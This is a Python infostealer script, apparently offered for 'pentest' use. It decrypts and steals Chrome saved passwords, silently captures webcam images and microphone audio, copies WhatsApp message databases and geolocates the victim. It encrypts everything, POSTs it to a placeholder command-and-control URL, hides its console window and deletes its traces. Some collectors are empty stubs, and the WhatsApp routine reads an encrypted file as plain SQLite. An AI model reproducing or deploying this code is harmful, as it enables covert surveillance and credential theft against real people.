import os
import sqlite3
import json
import requests
import subprocess
import base64
import socket
import cv2
import pyaudio
import wave
from cryptography.fernet import Fernet
import win32crypt
from pathlib import Path
import geocoder
import psutil
import shutil

# Obfuscated C2 server (replace with your pentest C2)
C2_URL = 'https://your-c2-server.com/upload'  # Use ngrok or VPS for testing
ENCRYPT_KEY = b'your_32_byte_key_here1234567890abcdef=='  # Generate with Fernet.generate_key()

def o(s):  # XOR obfuscation
    return ''.join(chr(ord(c) ^ 0xBB) for c in base64.b64decode(s).decode())

def get_encryption():
    return Fernet(ENCRYPT_KEY)

def exfil_data(data, filename):
    """Encrypt and POST data to C2"""
    cipher = get_encryption()
    encrypted = cipher.encrypt(json.dumps(data).encode())
    files = {'file': (filename, encrypted)}
    requests.post(C2_URL, files=files, timeout=10)

def get_ip_location():
    """Get public IP and geolocation"""
    try:
        ip = requests.get('https://api.ipify.org').text
        g = geocoder.ip(ip)
        return {'ip': ip, 'lat': g.lat, 'lng': g.lng, 'city': g.city, 'country': g.country}
    except:
        return {'ip': socket.gethostbyname(socket.gethostname())}

def steal_chrome_passwords():
    """Extract Chrome saved passwords (Windows)"""
    path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    if os.path.exists(path):
        shutil.copy2(path, 'temp_login.db')
        conn = sqlite3.connect('temp_login.db')
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        data = []
        for row in cursor.fetchall():
            pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
            data.append({'url': row[0], 'user': row[1], 'pwd': pwd})
        conn.close()
        os.remove('temp_login.db')
        return data

def dump_contacts_calllogs():
    """Windows contacts/messages (parse from various sources)"""
    # Simulate call logs/contacts from Outlook/CSV exports or registry
    contacts = []
    # Add real extraction from Windows Contacts API or PST files here
    return contacts

def capture_camera(duration=5):
    """Snap photo"""
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('cam.jpg', frame)
        with open('cam.jpg', 'rb') as f:
            img_data = f.read()
        os.remove('cam.jpg')
        return base64.b64encode(img_data).decode()
    cap.release()
    return None

def record_mic(duration=10, filename='mic.wav'):
    """Record audio"""
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = []
    for _ in range(0, int(RATE / CHUNK * duration)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    with open(filename, 'rb') as f:
        audio_data = base64.b64encode(f.read())
    os.remove(filename)
    return audio_data.decode()

def extract_whatsapp_db():
    """WhatsApp DB (Android backup or Windows paths)"""
    paths = [
        os.path.join(os.environ['USERPROFILE'], 'WhatsApp', 'Databases'),
        '/sdcard/WhatsApp/Databases/'  # If ADB access
    ]
    data = {}
    for path in paths:
        if os.path.exists(path):
            for db_file in Path(path).glob('msgstore.db.crypt*'):
                shutil.copy2(db_file, 'whatsapp.db')
                conn = sqlite3.connect('whatsapp.db')
                cursor = conn.cursor()
                cursor.execute('SELECT key_remote_jid, data FROM messages LIMIT 1000')
                msgs = [{'from': row[0], 'msg': row[1]} for row in cursor.fetchall()]
                data['whatsapp'] = msgs
                conn.close()
                os.remove('whatsapp.db')
                break
    return data

def get_sms_call_logs():
    """SMS/Call logs (Windows Phone or emulated)"""
    # For Windows: parse from messaging apps or registry
    return {'sms': [], 'calls': []}

def main():
    """Stealth data collection"""
    payload = {
        'hostname': socket.gethostname(),
        'user': os.getenv('USERNAME'),
        'ip_geo': get_ip_location(),
        'passwords': steal_chrome_passwords(),
        'contacts': dump_contacts_calllogs(),
        'sms_calls': get_sms_call_logs(),
        'whatsapp': extract_whatsapp_db()
    }
    
    # Media capture (silent)
    cam_img = capture_camera()
    if cam_img:
        payload['camera'] = cam_img[:10000]  # Truncate for exfil
    
    mic_audio = record_mic()
    if mic_audio:
        payload['mic'] = mic_audio[:50000]  # Truncate
    
    # Exfil all
    exfil_data(payload, 'infosteal.json')
    
    # Self-delete traces
    for f in ['temp_login.db', 'whatsapp.db']:
        if os.path.exists(f): os.remove(f)

if __name__ == '__main__':
    # Hide console, run silently
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()